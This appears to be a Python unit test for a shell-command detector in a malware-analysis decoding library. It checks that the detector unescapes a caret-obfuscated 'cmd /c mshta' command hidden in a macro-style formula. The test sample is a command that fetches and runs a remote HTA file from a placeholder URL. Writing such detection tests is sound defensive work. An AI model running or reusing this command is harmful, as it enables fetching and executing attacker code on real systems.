from multidecoder.analyzers.shell import find_cmd_strings
from multidecoder.hit import Hit

test = b'SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)'


def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Hit(value=b'cmd /c mshta http://some.url/x.html',
            start=13,
            end=55,
            obfuscation='unescape.shell.carets')
    ]
